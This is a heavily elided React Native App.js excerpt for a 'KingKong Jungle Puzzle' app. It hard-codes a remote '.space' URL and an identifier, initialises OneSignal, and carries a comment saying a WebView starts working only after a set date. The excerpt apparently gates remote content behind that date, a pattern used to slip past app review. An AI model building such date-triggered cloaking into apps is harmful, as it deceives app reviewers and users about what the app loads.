...
////////////////////////////////////////////
import KingKongJunglePuzzleProductScreen from './src/screens/KingKongJunglePuzzleProductScreen';
...
function App() {
  ...
  const INITIAL_URL = `https://wonderful-distinguished-ecstasy.space/`;
  const URL_IDENTIFAIRE = `Q8qjY45t`;
  ...
  OneSignal.initialize('90652f4b-c1ba-43d7-8997-a8986d27db1d');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-03-22T10:00:00'); //дата з якої поч працювати webView
      ...
      return (
        <Stack.Navigator>
          <Stack.Screen
            ...
            name="KingKongJunglePuzzleProductScreen"
            component={KingKongJunglePuzzleProductScreen}
